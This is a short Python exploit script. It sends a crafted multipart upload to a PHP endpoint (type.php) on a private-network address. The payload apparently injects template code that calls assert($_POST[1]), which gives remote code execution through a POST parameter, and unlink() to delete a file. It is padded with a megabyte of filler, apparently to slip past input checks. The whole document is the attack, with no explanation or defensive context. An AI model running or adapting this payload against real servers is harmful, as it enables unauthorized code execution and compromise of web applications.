import requests
from io import BytesIO

files = {
  'file': BytesIO(b'template=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss' + b'a' * 1000000)
}

res = requests.post('http://192.168.86.208/type.php', files=files, allow_redirects=False)
print(res.headers)